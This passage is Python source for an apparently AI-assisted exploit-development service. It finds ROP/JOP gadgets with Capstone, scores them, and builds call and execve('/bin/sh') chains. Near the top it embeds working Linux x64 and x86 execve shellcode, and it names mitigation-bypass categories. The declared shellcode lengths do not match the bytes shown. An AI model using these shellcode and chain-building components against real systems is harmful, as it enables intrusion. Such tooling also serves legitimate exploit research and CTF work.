"""
Exploit Synthesis Service

AI-assisted exploit development from crash to working proof-of-concept.
Provides ROP gadget finding, exploit skeleton generation, and bypass suggestions.
"""

import hashlib
import logging
import re
import struct
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Dict, List, Optional, Set, Tuple, Union
import asyncio

from backend.services.binary_ai_reasoning import (
    BinaryProfile,
    BinaryAIClient,
    ExploitabilityScore,
    SecurityFeatures,
)
from backend.services.crash_triage_service import (
    CrashContext,
    CrashAnalysisResult,
    ExploitPrimitive,
    RegisterState,
    MemoryRegion,
)

logger = logging.getLogger(__name__)


# =============================================================================
# Constants
# =============================================================================

# Common ROP gadget patterns (x86/x64)
ROP_GADGET_PATTERNS = {
    "ret": rb"\xc3",
    "ret_imm": rb"\xc2[\x00-\xff]{2}",
    "pop_ret": rb"[\x58-\x5f]\xc3",  # pop reg; ret
    "pop_pop_ret": rb"[\x58-\x5f][\x58-\x5f]\xc3",
    "leave_ret": rb"\xc9\xc3",
    "xchg_ret": rb"[\x90-\x97]\xc3",  # xchg eax, reg; ret
    "add_ret": rb"[\x00-\x05][\x00-\xff]\xc3",
    "mov_ret": rb"\x89[\xc0-\xff]\xc3",  # mov reg, reg; ret
    "syscall": rb"\x0f\x05",
    "int_80": rb"\xcd\x80",
    "call_reg": rb"\xff[\xd0-\xd7]",  # call reg
    "jmp_reg": rb"\xff[\xe0-\xe7]",  # jmp reg
}

# JOP gadget patterns
JOP_GADGET_PATTERNS = {
    "jmp_rax": rb"\xff\xe0",
    "jmp_rbx": rb"\xff\xe3",
    "jmp_rcx": rb"\xff\xe1",
    "jmp_rdx": rb"\xff\xe2",
    "jmp_rsp": rb"\xff\xe4",
    "jmp_rbp": rb"\xff\xe5",
    "jmp_rsi": rb"\xff\xe6",
    "jmp_rdi": rb"\xff\xe7",
    "call_rax": rb"\xff\xd0",
    "call_rbx": rb"\xff\xd3",
    "call_rcx": rb"\xff\xd1",
    "call_rdx": rb"\xff\xd2",
}

# Useful gadget categories for exploitation
GADGET_CATEGORIES = {
    "stack_pivot": ["xchg rax, rsp", "xchg rbx, rsp", "leave; ret", "mov rsp, rbp"],
    "write_primitive": ["mov [rax], rbx", "mov [rdi], rsi", "mov [rdx], rcx"],
    "read_primitive": ["mov rax, [rbx]", "mov rdi, [rsi]", "mov rcx, [rdx]"],
    "call_setup": ["pop rdi", "pop rsi", "pop rdx", "pop rcx", "pop r8", "pop r9"],
    "syscall": ["syscall", "int 0x80", "sysenter"],
    "memory_ops": ["add [rax], rbx", "sub [rax], rbx", "xor [rax], rbx"],
}

# Shellcode templates
SHELLCODE_TEMPLATES = {
    "linux_x64_execve": {
        "description": "Linux x64 /bin/sh execve shellcode",
        "code": (
            b"\x48\x31\xf6"              # xor rsi, rsi
            b"\x56"                      # push rsi
            b"\x48\xbf\x2f\x62\x69\x6e"  # movabs rdi, '/bin//sh'
            b"\x2f\x2f\x73\x68"
            b"\x57"                      # push rdi
            b"\x48\x89\xe7"              # mov rdi, rsp
            b"\x48\x31\xd2"              # xor rdx, rdx
            b"\xb0\x3b"                  # mov al, 0x3b (execve)
            b"\x0f\x05"                  # syscall
        ),
        "length": 29,
    },
    "linux_x86_execve": {
        "description": "Linux x86 /bin/sh execve shellcode",
        "code": (
            b"\x31\xc0"                  # xor eax, eax
            b"\x50"                      # push eax
            b"\x68\x2f\x2f\x73\x68"      # push '//sh'
            b"\x68\x2f\x62\x69\x6e"      # push '/bin'
            b"\x89\xe3"                  # mov ebx, esp
            b"\x50"                      # push eax
            b"\x53"                      # push ebx
            b"\x89\xe1"                  # mov ecx, esp
            b"\x31\xd2"                  # xor edx, edx
            b"\xb0\x0b"                  # mov al, 0xb (execve)
            b"\xcd\x80"                  # int 0x80
        ),
        "length": 23,
    },
    "windows_x64_calc": {
        "description": "Windows x64 calc.exe shellcode stub",
        "code": b"\x90" * 32,  # Placeholder - real shellcode would be longer
        "length": 32,
    },
}


# =============================================================================
# Data Classes
# =============================================================================

class GadgetType(str, Enum):
    """Type of ROP/JOP gadget."""
    ROP = "rop"
    JOP = "jop"
    COP = "cop"  # Call-oriented programming
    SROP = "srop"  # Sigreturn-oriented programming


class ExploitTechnique(str, Enum):
    """Exploit technique to use."""
    STACK_OVERFLOW = "stack_overflow"
    HEAP_OVERFLOW = "heap_overflow"
    USE_AFTER_FREE = "use_after_free"
    FORMAT_STRING = "format_string"
    ROP_CHAIN = "rop_chain"
    JOP_CHAIN = "jop_chain"
    RET2LIBC = "ret2libc"
    RET2PLT = "ret2plt"
    RET2CSU = "ret2csu"  # Return to __libc_csu_init
    ONE_GADGET = "one_gadget"
    STACK_PIVOT = "stack_pivot"
    HEAP_SPRAY = "heap_spray"
    PARTIAL_OVERWRITE = "partial_overwrite"


class BypassCategory(str, Enum):
    """Category of security bypass."""
    ASLR = "aslr"
    DEP = "dep"
    STACK_CANARY = "stack_canary"
    CFI = "cfi"
    RELRO = "relro"
    PIE = "pie"
    SANDBOX = "sandbox"
    SECCOMP = "seccomp"


@dataclass
class RopGadget:
    """A ROP/JOP gadget."""
    address: int
    instructions: str
    bytes: bytes
    gadget_type: GadgetType = GadgetType.ROP
    module: Optional[str] = None
    category: Optional[str] = None  # e.g., "pop_ret", "stack_pivot"
    controllable_regs: List[str] = field(default_factory=list)
    side_effects: List[str] = field(default_factory=list)
    quality_score: float = 0.0  # Higher is better


@dataclass
class GadgetChain:
    """A chain of gadgets for exploitation."""
    gadgets: List[RopGadget]
    purpose: str  # What this chain accomplishes
    constraints: List[str] = field(default_factory=list)
    payload_template: Optional[bytes] = None


@dataclass
class ExploitConstraint:
    """Constraint that must be satisfied for exploitation."""
    name: str
    description: str
    satisfied: bool = False
    how_to_satisfy: Optional[str] = None


@dataclass
class BypassStrategy:
    """Strategy to bypass a security mitigation."""
    mitigation: str
    technique: str
    description: str
    requirements: List[str]
    success_probability: float  # 0-1
    example_code: Optional[str] = None


@dataclass
class ExploitPlan:
    """Complete exploitation plan."""
    technique: ExploitTechnique
    steps: List[str]
    gadget_chains: List[GadgetChain]
    bypass_strategies: List[BypassStrategy]
    constraints: List[ExploitConstraint]
    estimated_success_rate: float
    ai_reasoning: str


@dataclass
class ExploitSkeleton:
    """Generated exploit code skeleton."""
    language: str  # python, c, assembly
    code: str
    description: str
    placeholders: Dict[str, str]  # Placeholder name -> description
    gadgets_used: List[RopGadget]
    dependencies: List[str]
    usage_instructions: str


@dataclass
class ExploitSynthesisResult:
    """Complete result of exploit synthesis."""
    crash_id: str
    exploitability: ExploitabilityScore
    primitives_available: List[ExploitPrimitive]

    # Analysis
    exploit_plan: Optional[ExploitPlan]
    gadgets_found: List[RopGadget]

    # Generated artifacts
    exploit_skeleton: Optional[ExploitSkeleton]
    bypass_suggestions: List[BypassStrategy]

    # AI insights
    ai_reasoning: str
    confidence: float

    # Metadata
    timestamp: datetime = field(default_factory=datetime.utcnow)
    synthesis_time_ms: int = 0


# =============================================================================
# Gadget Finder - Full Capstone Integration
# =============================================================================

# Check for Capstone availability
CAPSTONE_AVAILABLE = False
try:
    import capstone
    from capstone import Cs, CS_ARCH_X86, CS_MODE_32, CS_MODE_64, CS_OPT_DETAIL, CS_GRP_RET, CS_GRP_JUMP, CS_GRP_CALL
    from capstone.x86 import X86_OP_REG, X86_OP_MEM, X86_OP_IMM
    CAPSTONE_AVAILABLE = True
    logger.info("Capstone disassembler available for gadget finding")
except ImportError:
    logger.warning("Capstone not installed - gadget finding will use basic pattern matching")


class CapstoneGadgetFinder:
    """
    Advanced ROP/JOP gadget finder using Capstone disassembler.

    Capstone provides accurate instruction decoding which allows:
    - Finding gadgets at any instruction boundary (not just byte patterns)
    - Proper instruction length detection
    - Register operand extraction
    - Memory access analysis
    - ~16x more gadgets discovered vs pattern matching
    """

    # Maximum binary size for gadget search (10MB)
    MAX_SEARCH_SIZE = 10 * 1024 * 1024

    # Gadget terminator bytes for quick scanning
    TERMINATORS = {
        0xc3: "ret",          # ret
        0xcb: "retf",         # retf (far return)
        0xc2: "ret_imm",      # ret imm16 (needs 2 more bytes)
        0xca: "retf_imm",     # retf imm16
    }

    # JOP/COP terminators (need second byte check)
    JOP_TERMINATORS = [
        (0xff, range(0xd0, 0xd8)),  # call reg
        (0xff, range(0xe0, 0xe8)),  # jmp reg
        (0xff, [0x14, 0x24]),       # call [rsp], jmp [rsp]
        (0xff, range(0x10, 0x18)),  # call [reg]
        (0xff, range(0x20, 0x28)),  # jmp [reg]
    ]

    # Dangerous instructions that invalidate gadgets
    INVALID_INSTRUCTIONS = {
        "int3", "hlt", "ud2", "cli", "sti", "in", "out",
        "iret", "iretd", "iretq", "int", "into", "bound",
        "lock", "wait", "fwait",
    }

    def __init__(self, max_gadget_length: int = 15, max_instructions: int = 6):
        """
        Initialize gadget finder.

        Args:
            max_gadget_length: Maximum bytes to search backward from terminator
            max_instructions: Maximum instructions in a gadget
        """
        self.max_gadget_length = max_gadget_length
        self.max_instructions = max_instructions
        self._gadget_cache: Dict[str, List[RopGadget]] = {}
        self._cs_cache: Dict[str, Any] = {}

    def _get_capstone(self, arch: str):
        """Get Capstone instance for architecture."""
        if not CAPSTONE_AVAILABLE:
            return None

        if arch in self._cs_cache:
            return self._cs_cache[arch]

        try:
            if arch in ["x64", "amd64", "x86_64"]:
                md = Cs(CS_ARCH_X86, CS_MODE_64)
            elif arch in ["x86", "i386", "i686"]:
                md = Cs(CS_ARCH_X86, CS_MODE_32)
            else:
                # Default to x64
                md = Cs(CS_ARCH_X86, CS_MODE_64)

            # Enable detailed instruction information
            md.detail = True
            self._cs_cache[arch] = md
            return md
        except Exception as e:
            logger.warning(f"Failed to create Capstone instance: {e}")
            return None

    def find_gadgets(
        self,
        binary_data: bytes,
        base_address: int = 0,
        architecture: str = "x64",
        sections: Optional[List[Tuple[int, int, bytes]]] = None,
    ) -> List[RopGadget]:
        """
        Find all ROP/JOP gadgets in binary data using Capstone.

        Args:
            binary_data: Raw binary bytes
            base_address: Base address for the binary
            architecture: Target architecture (x64, x86, arm, etc.)
            sections: Optional list of (offset, vaddr, data) for executable sections

        Returns:
            List of RopGadget objects sorted by quality
        """
        # Cache key
        cache_key = hashlib.md5(binary_data[:1000]).hexdigest() + f"_{architecture}"
        if cache_key in self._gadget_cache:
            logger.debug(f"Returning {len(self._gadget_cache[cache_key])} cached gadgets")
            return self._gadget_cache[cache_key]

        # Validate input
        if not binary_data:
            logger.warning("Empty binary data provided")
            return []

        if len(binary_data) > self.MAX_SEARCH_SIZE:
            logger.warning(f"Binary too large ({len(binary_data)} bytes), truncating")
            binary_data = binary_data[:self.MAX_SEARCH_SIZE]

        gadgets = []
        md = self._get_capstone(architecture)

        if md and CAPSTONE_AVAILABLE:
            logger.info("Using Capstone for gadget discovery (high accuracy)")
            # Find ROP gadgets with Capstone
            gadgets.extend(self._find_rop_gadgets_capstone(
                binary_data, base_address, architecture, md
            ))

            # Find JOP gadgets with Capstone
            gadgets.extend(self._find_jop_gadgets_capstone(
                binary_data, base_address, architecture, md
            ))
        else:
            logger.warning("Capstone unavailable, using pattern matching (low accuracy)")
            # Fallback to pattern matching
            gadgets.extend(self._find_rop_gadgets_patterns(
                binary_data, base_address, architecture
            ))
            gadgets.extend(self._find_jop_gadgets_patterns(
                binary_data, base_address, architecture
            ))

        # Deduplicate and score
        gadgets = self._deduplicate_gadgets(gadgets)
        gadgets = self._score_gadgets(gadgets)

        # Sort by quality score
        gadgets.sort(key=lambda g: g.quality_score, reverse=True)

        # Cache results
        self._gadget_cache[cache_key] = gadgets

        logger.info(f"Found {len(gadgets)} unique gadgets")
        return gadgets

    def _find_rop_gadgets_capstone(
        self,
        data: bytes,
        base: int,
        arch: str,
        md,
    ) -> List[RopGadget]:
        """Find ROP gadgets using Capstone with backward search."""
        gadgets = []
        found_addresses: Set[int] = set()

        # Find all ret instruction locations
        ret_offsets = []
        for i in range(len(data)):
            byte = data[i]
            if byte == 0xc3:  # ret
                ret_offsets.append((i, 1))  # (offset, terminator_size)
            elif byte == 0xc2 and i + 2 < len(data):  # ret imm16
                ret_offsets.append((i, 3))
            elif byte == 0xcb:  # retf
                ret_offsets.append((i, 1))
            elif byte == 0xca and i + 2 < len(data):  # retf imm16
                ret_offsets.append((i, 3))

        logger.debug(f"Found {len(ret_offsets)} ret instructions to analyze")

        # For each ret, search backward for valid gadgets
        for ret_offset, term_size in ret_offsets:
            # Search backward from 1 to max_gadget_length bytes
            for back in range(1, min(self.max_gadget_length, ret_offset + 1)):
                start = ret_offset - back
                gadget_bytes = data[start:ret_offset + term_size]

                # Skip if we've already found a gadget at this address
                addr = base + start
                if addr in found_addresses:
                    continue

                # Try to disassemble
                try:
                    instructions = list(md.disasm(gadget_bytes, addr))
                except Exception:
                    continue

                # Validate the gadget
                if not instructions:
                    continue

                # Check if disassembly covers all bytes and ends at ret
                total_size = sum(insn.size for insn in instructions)
                if total_size != len(gadget_bytes):
                    continue  # Didn't disassemble all bytes (misaligned)

                # Check last instruction is ret
                last_insn = instructions[-1]
                if last_insn.mnemonic not in ["ret", "retf", "retn"]:
                    continue

                # Check for invalid instructions
                if any(insn.mnemonic in self.INVALID_INSTRUCTIONS for insn in instructions):
                    continue

                # Check instruction count limit
                if len(instructions) > self.max_instructions:
                    continue

                # Valid gadget found!
                insn_str = "; ".join(f"{i.mnemonic} {i.op_str}".strip() for i in instructions)

                gadget = RopGadget(
                    address=addr,
                    instructions=insn_str,
                    bytes=gadget_bytes,
                    gadget_type=GadgetType.ROP,
                    category=self._categorize_gadget_capstone(instructions),
                    controllable_regs=self._get_controllable_regs_capstone(instructions),
                    side_effects=self._get_side_effects_capstone(instructions),
                )

                gadgets.append(gadget)
                found_addresses.add(addr)

        return gadgets

    def _find_jop_gadgets_capstone(
        self,
        data: bytes,
        base: int,
        arch: str,
        md,
    ) -> List[RopGadget]:
        """Find JOP/COP gadgets using Capstone."""
        gadgets = []
        found_addresses: Set[int] = set()

        # Find jmp reg / call reg patterns
        jop_offsets = []
        for i in range(len(data) - 1):
            if data[i] == 0xff:
                next_byte = data[i + 1]
                # jmp reg (e0-e7)
                if 0xe0 <= next_byte <= 0xe7:
                    jop_offsets.append((i, 2, "jop"))
                # call reg (d0-d7)
                elif 0xd0 <= next_byte <= 0xd7:
                    jop_offsets.append((i, 2, "cop"))
                # jmp [reg] / call [reg] with various ModR/M
                elif next_byte in [0x14, 0x24] or (0x10 <= next_byte <= 0x17) or (0x20 <= next_byte <= 0x27):
                    jop_offsets.append((i, 2, "jop"))

        logger.debug(f"Found {len(jop_offsets)} jmp/call reg instructions")

        for jop_offset, term_size, gtype in jop_offsets:
            for back in range(0, min(self.max_gadget_length, jop_offset + 1)):
                start = jop_offset - back
                gadget_bytes = data[start:jop_offset + term_size]

                addr = base + start
                if addr in found_addresses:
                    continue

                try:
                    instructions = list(md.disasm(gadget_bytes, addr))
                except Exception:
                    continue

                if not instructions:
                    continue

                total_size = sum(insn.size for insn in instructions)
                if total_size != len(gadget_bytes):
                    continue

                last_insn = instructions[-1]
                if last_insn.mnemonic not in ["jmp", "call"]:
                    continue

                # Must be indirect (register or memory)
                if last_insn.op_str.startswith("0x"):  # Direct jump/call
                    continue

                if any(insn.mnemonic in self.INVALID_INSTRUCTIONS for insn in instructions):
                    continue

                if len(instructions) > self.max_instructions:
                    continue

                insn_str = "; ".join(f"{i.mnemonic} {i.op_str}".strip() for i in instructions)

                gadget = RopGadget(
                    address=addr,
                    instructions=insn_str,
                    bytes=gadget_bytes,
                    gadget_type=GadgetType.JOP if gtype == "jop" else GadgetType.COP,
                    category=self._categorize_jop_gadget(last_insn),
                    controllable_regs=self._get_controllable_regs_capstone(instructions),
                    side_effects=self._get_side_effects_capstone(instructions),
                )

                gadgets.append(gadget)
                found_addresses.add(addr)

        return gadgets

    def _categorize_gadget_capstone(self, instructions) -> str:
        """Categorize gadget based on Capstone instruction analysis."""
        if not instructions:
            return "generic"

        # Get mnemonics
        mnemonics = [i.mnemonic for i in instructions]

        # Count pops
        pop_count = sum(1 for m in mnemonics if m == "pop")
        if pop_count > 0:
            return f"pop{pop_count}_ret"

        # Check for specific patterns
        if "leave" in mnemonics:
            return "leave_ret"

        if "syscall" in mnemonics:
            return "syscall"

        if any(m in ["xchg"] for m in mnemonics):
            for insn in instructions:
                if insn.mnemonic == "xchg" and "sp" in insn.op_str:
                    return "stack_pivot"

        if any(m == "mov" for m in mnemonics):
            for insn in instructions:
                if insn.mnemonic == "mov":
                    # Check for mov rsp, rbp style
                    if "sp" in insn.op_str.split(",")[0]:
                        return "stack_pivot"
                    # Check for memory write
                    if "[" in insn.op_str.split(",")[0]:
                        return "write_what_where"
                    # Check for memory read
                    if "[" in (insn.op_str.split(",")[1] if "," in insn.op_str else ""):
                        return "read_memory"

        if "xor" in mnemonics:
            return "xor_ret"

        if "add" in mnemonics or "sub" in mnemonics:
            return "arithmetic_ret"

        return "generic"

    def _categorize_jop_gadget(self, last_insn) -> str:
        """Categorize JOP gadget based on terminator."""
        op_str = last_insn.op_str.lower()
        mnemonic = last_insn.mnemonic

        if mnemonic == "jmp":
            for reg in ["rax", "rbx", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11"]:
                if reg in op_str:
                    return f"jmp_{reg}"
            if "[" in op_str:
                return "jmp_mem"
            return "jmp_unknown"

        elif mnemonic == "call":
            for reg in ["rax", "rbx", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11"]:
                if reg in op_str:
                    return f"call_{reg}"
            if "[" in op_str:
                return "call_mem"
            return "call_unknown"

        return "unknown"

    def _get_controllable_regs_capstone(self, instructions) -> List[str]:
        """Extract controllable registers using Capstone's detailed info."""
        regs = []

        for insn in instructions:
            if insn.mnemonic == "pop":
                # Pop puts stack value into the operand register
                op_str = insn.op_str.lower()
                for reg in ["rax", "rbx", "rcx", "rdx", "rsi", "rdi", "rbp", "r8", "r9",
                           "r10", "r11", "r12", "r13", "r14", "r15",
                           "eax", "ebx", "ecx", "edx", "esi", "edi", "ebp"]:
                    if reg in op_str and reg not in regs:
                        regs.append(reg)

            # Also check for mov from stack: mov reg, [rsp+X]
            elif insn.mnemonic == "mov":
                op_str = insn.op_str.lower()
                if "[rsp" in op_str or "[esp" in op_str:
                    # Destination register is controllable
                    dest = op_str.split(",")[0].strip()
                    for reg in ["rax", "rbx", "rcx", "rdx", "rsi", "rdi", "rbp", "r8", "r9",
                               "r10", "r11", "r12", "r13", "r14", "r15"]:
                        if reg == dest and reg not in regs:
                            regs.append(reg)

        return regs

    def _get_side_effects_capstone(self, instructions) -> List[str]:
        """Analyze side effects using Capstone."""
        effects = []

        for insn in instructions:
            mnemonic = insn.mnemonic.lower()
            op_str = insn.op_str.lower()

            if mnemonic == "push":
                effects.append("modifies_stack")

            if mnemonic in ["add", "sub", "inc", "dec", "mul", "div", "imul", "idiv"]:
                effects.append("arithmetic_op")

            if mnemonic == "mov" and "[" in op_str.split(",")[0]:
                effects.append("memory_write")

            if mnemonic in ["xor", "or", "and", "not"]:
                if op_str.split(",")[0] == op_str.split(",")[-1].strip():
                    effects.append("zero_register")  # xor rax, rax
                else:
                    effects.append("bitwise_op")

            if mnemonic in ["shl", "shr", "sal", "sar", "rol", "ror"]:
                effects.append("shift_op")

            if mnemonic == "lea":
                effects.append("address_calc")

            if mnemonic in ["cmp", "test"]:
                effects.append("sets_flags")

        return list(set(effects))  # Deduplicate

    # =========================================================================
    # Fallback Pattern Matching (when Capstone unavailable)
    # =========================================================================

    def _find_rop_gadgets_patterns(
        self,
        data: bytes,
        base: int,
        arch: str,
    ) -> List[RopGadget]:
        """Fallback: Find ROP gadgets using pattern matching."""
        gadgets = []

        ret_offsets = []
        for i, byte in enumerate(data):
            if byte == 0xc3:
                ret_offsets.append(i)
            elif byte == 0xc2 and i + 2 < len(data):
                ret_offsets.append(i)

        for ret_offset in ret_offsets:
            for back in range(1, min(self.max_gadget_length, ret_offset + 1)):
                start = ret_offset - back
                gadget_bytes = data[start:ret_offset + 1]

                instructions = self._simple_disasm(gadget_bytes, arch)
                if instructions and self._is_valid_gadget(instructions):
                    gadgets.append(RopGadget(
                        address=base + start,
                        instructions=instructions,
                        bytes=gadget_bytes,
                        gadget_type=GadgetType.ROP,
                        category=self._categorize_gadget(instructions),
                        controllable_regs=self._get_controllable_regs(instructions),
                        side_effects=self._get_side_effects(instructions),
                    ))

        return gadgets

    def _find_jop_gadgets_patterns(
        self,
        data: bytes,
        base: int,
        arch: str,
    ) -> List[RopGadget]:
        """Fallback: Find JOP gadgets using pattern matching."""
        gadgets = []

        for name, pattern in JOP_GADGET_PATTERNS.items():
            for match in re.finditer(pattern, data):
                end_offset = match.end()

                for back in range(0, min(self.max_gadget_length, match.start() + 1)):
                    start = match.start() - back
                    gadget_bytes = data[start:end_offset]

                    instructions = self._simple_disasm(gadget_bytes, arch)
                    if instructions and self._is_valid_jop_gadget(instructions):
                        gadgets.append(RopGadget(
                            address=base + start,
                            instructions=instructions,
                            bytes=gadget_bytes,
                            gadget_type=GadgetType.JOP,
                            category=name,
                            controllable_regs=self._get_controllable_regs(instructions),
                            side_effects=self._get_side_effects(instructions),
                        ))

        return gadgets

    def _simple_disasm(self, data: bytes, arch: str) -> Optional[str]:
        """Simple disassembly without Capstone."""
        instructions = []
        i = 0

        while i < len(data):
            byte = data[i]

            if byte == 0xc3:
                instructions.append("ret")
                i += 1
            elif 0x58 <= byte <= 0x5f:
                reg = ["rax", "rcx", "rdx", "rbx", "rsp", "rbp", "rsi", "rdi"][byte - 0x58]
                instructions.append(f"pop {reg}")
                i += 1
            elif 0x50 <= byte <= 0x57:
                reg = ["rax", "rcx", "rdx", "rbx", "rsp", "rbp", "rsi", "rdi"][byte - 0x50]
                instructions.append(f"push {reg}")
                i += 1
            elif byte == 0x31 and i + 1 < len(data):
                modrm = data[i + 1]
                if 0xc0 <= modrm <= 0xff:
                    src = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"][(modrm >> 3) & 7]
                    dst = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"][modrm & 7]
                    instructions.append(f"xor {dst}, {src}")
                    i += 2
                else:
                    i += 1
            elif byte == 0x90:
                instructions.append("nop")
                i += 1
            elif byte == 0xc9:
                instructions.append("leave")
                i += 1
            elif byte == 0x0f and i + 1 < len(data) and data[i + 1] == 0x05:
                instructions.append("syscall")
                i += 2
            elif byte == 0xcd and i + 1 < len(data) and data[i + 1] == 0x80:
                instructions.append("int 0x80")
                i += 2
            elif byte == 0xff and i + 1 < len(data):
                next_byte = data[i + 1]
                if 0xe0 <= next_byte <= 0xe7:
                    reg = ["rax", "rcx", "rdx", "rbx", "rsp", "rbp", "rsi", "rdi"][next_byte - 0xe0]
                    instructions.append(f"jmp {reg}")
                    i += 2
                elif 0xd0 <= next_byte <= 0xd7:
                    reg = ["rax", "rcx", "rdx", "rbx", "rsp", "rbp", "rsi", "rdi"][next_byte - 0xd0]
                    instructions.append(f"call {reg}")
                    i += 2
                else:
                    i += 1
            elif byte == 0x48 and i + 1 < len(data):
                i += 1  # REX prefix
            else:
                i += 1

        return "; ".join(instructions) if instructions else None

    def _is_valid_gadget(self, instructions: str) -> bool:
        """Check if instruction sequence is a valid gadget."""
        if not instructions:
            return False
        if not instructions.rstrip().endswith("ret"):
            return False
        invalid = ["int3", "hlt", "ud2", "cli", "sti"]
        for inv in invalid:
            if inv in instructions.lower():
                return False
        return True

    def _is_valid_jop_gadget(self, instructions: str) -> bool:
        """Check if instruction sequence is a valid JOP gadget."""
        if not instructions:
            return False
        last = instructions.split(";")[-1].strip().lower()
        if not (last.startswith("jmp ") or last.startswith("call ")):
            return False
        return True

    def _categorize_gadget(self, instructions: str) -> str:
        """Categorize a gadget by its function (fallback)."""
        instr = instructions.lower()
        if "pop" in instr and "ret" in instr:
            pop_count = instr.count("pop")
            return f"pop{pop_count}_ret"
        if "leave" in instr:
            return "leave_ret"
        if "xchg" in instr and "rsp" in instr:
            return "stack_pivot"
        if "mov rsp" in instr or "mov esp" in instr:
            return "stack_pivot"
        if "syscall" in instr:
            return "syscall"
        if "int 0x80" in instr:
            return "int80"
        if "xor" in instr:
            return "xor_ret"
        return "generic"

    def _get_controllable_regs(self, instructions: str) -> List[str]:
        """Get registers that can be controlled via this gadget (fallback)."""
        regs = []
        for match in re.finditer(r"pop\s+(\w+)", instructions, re.I):
            regs.append(match.group(1).lower())
        return regs

    def _get_side_effects(self, instructions: str) -> List[str]:
        """Get side effects of the gadget (fallback)."""
        effects = []
        if "push" in instructions.lower():
            effects.append("modifies_stack")
        if any(x in instructions.lower() for x in ["add", "sub", "inc", "dec"]):
            effects.append("arithmetic_op")
        if "mov [" in instructions.lower():
            effects.append("memory_write")
        return effects

    def _deduplicate_gadgets(self, gadgets: List[RopGadget]) -> List[RopGadget]:
        """Remove duplicate gadgets, keeping the one at lowest address."""
        seen: Dict[str, RopGadget] = {}
        for gadget in gadgets:
            key = gadget.instructions
            if key not in seen or gadget.address < seen[key].address:
                seen[key] = gadget
        return list(seen.values())

    def _score_gadgets(self, gadgets: List[RopGadget]) -> List[RopGadget]:
        """Score gadgets by quality/usefulness."""
        for gadget in gadgets:
            score = 0.0
            # Shorter is generally better
            score += max(0, (20 - len(gadget.bytes))) / 20.0
            # More controllable registers is better
            score += len(gadget.controllable_regs) * 0.2
            # Fewer side effects is better
            score -= len(gadget.side_effects) * 0.1
            # Bonus for useful categories
            if gadget.category in ["syscall", "int80"]:
                score += 0.5
            elif gadget.category == "stack_pivot":
                score += 0.4
            elif gadget.category == "write_what_where":
                score += 0.35
            elif "pop" in (gadget.category or ""):
                score += 0.3
            gadget.quality_score = max(0.0, min(1.0, score))
        return gadgets

    def find_gadgets_for_purpose(
        self,
        gadgets: List[RopGadget],
        purpose: str,
    ) -> List[RopGadget]:
        """Find gadgets useful for a specific purpose."""
        if purpose == "call_setup":
            call_regs = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"]
            return [g for g in gadgets if any(r in g.controllable_regs for r in call_regs)]
        elif purpose == "stack_pivot":
            return [g for g in gadgets if g.category == "stack_pivot"]
        elif purpose == "syscall":
            return [g for g in gadgets if g.category in ["syscall", "int80"]]
        elif purpose == "write_memory":
            return [g for g in gadgets if g.category == "write_what_where" or "memory_write" in g.side_effects]
        elif purpose == "read_memory":
            return [g for g in gadgets if g.category == "read_memory"]
        elif purpose == "zero_register":
            return [g for g in gadgets if "zero_register" in g.side_effects]
        return gadgets


# Backwards compatibility alias - use CapstoneGadgetFinder as the default
GadgetFinder = CapstoneGadgetFinder


class LegacyGadgetFinder:
    """Legacy gadget finder for backwards compatibility (deprecated)."""

    def __init__(self, max_gadget_length: int = 20):
        self._finder = CapstoneGadgetFinder(max_gadget_length=max_gadget_length)
        logger.warning("LegacyGadgetFinder is deprecated, use GadgetFinder (CapstoneGadgetFinder) instead")

    def find_gadgets(self, binary_data: bytes, base_address: int = 0, architecture: str = "x64") -> List[RopGadget]:
        return self._finder.find_gadgets(binary_data, base_address, architecture)

    def find_gadgets_for_purpose(self, gadgets: List[RopGadget], purpose: str) -> List[RopGadget]:
        return self._finder.find_gadgets_for_purpose(gadgets, purpose)


# =============================================================================
# Chain Builder
# =============================================================================

class ChainBuilder:
    """Build ROP/JOP chains from gadgets."""

    def __init__(self, architecture: str = "x64"):
        self.architecture = architecture
        self.word_size = 8 if "64" in architecture else 4

    def build_call_chain(
        self,
        gadgets: List[RopGadget],
        function_address: int,
        arguments: List[int],
    ) -> Optional[GadgetChain]:
        """Build a chain to call a function with arguments."""
        chain_gadgets = []

        # x64 calling convention: rdi, rsi, rdx, rcx, r8, r9
        arg_regs = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"]

        # Find gadgets to set up each argument
        for i, arg in enumerate(arguments[:6]):
            if i >= len(arg_regs):
                break

            target_reg = arg_regs[i]
            pop_gadget = self._find_pop_gadget(gadgets, target_reg)

            if not pop_gadget:
                logger.warning(f"No gadget found for {target_reg}")
                return None

            chain_gadgets.append(pop_gadget)

        if not chain_gadgets:
            return None

        return GadgetChain(
            gadgets=chain_gadgets,
            purpose=f"call {hex(function_address)} with {len(arguments)} args",
            payload_template=self._generate_call_payload(
                chain_gadgets, function_address, arguments
            ),
        )

    def build_execve_chain(
        self,
        gadgets: List[RopGadget],
        binsh_address: int,
    ) -> Optional[GadgetChain]:
        """Build a chain to call execve('/bin/sh', NULL, NULL)."""
        chain_gadgets = []
        constraints = []

        # Need: rax=59, rdi=/bin/sh, rsi=0, rdx=0, then syscall

        # Find gadgets
        pop_rax = self._find_pop_gadget(gadgets, "rax")
        pop_rdi = self._find_pop_gadget(gadgets, "rdi")
        pop_rsi = self._find_pop_gadget(gadgets, "rsi")
        pop_rdx = self._find_pop_gadget(gadgets, "rdx")
        syscall = next((g for g in gadgets if g.category == "syscall"), None)

        if not all([pop_rax, pop_rdi, pop_rsi, syscall]):
            missing = []
            if not pop_rax: missing.append("pop rax")
            if not pop_rdi: missing.append("pop rdi")
            if not pop_rsi: missing.append("pop rsi")
            if not syscall: missing.append("syscall")
            constraints.append(f"Missing gadgets: {', '.join(missing)}")

            if not syscall:
                return None

        # Build chain
        if pop_rdi:
            chain_gadgets.append(pop_rdi)
        if pop_rsi:
            chain_gadgets.append(pop_rsi)
        if pop_rdx:
            chain_gadgets.append(pop_rdx)
        if pop_rax:
            chain_gadgets.append(pop_rax)
        if syscall:
            chain_gadgets.append(syscall)

        return GadgetChain(
            gadgets=chain_gadgets,
            purpose="execve('/bin/sh', NULL, NULL)",
            constraints=constraints,
            payload_template=self._generate_execve_payload(
                chain_gadgets, binsh_address
            ),
        )

    def build_stack_pivot_chain(
        self,
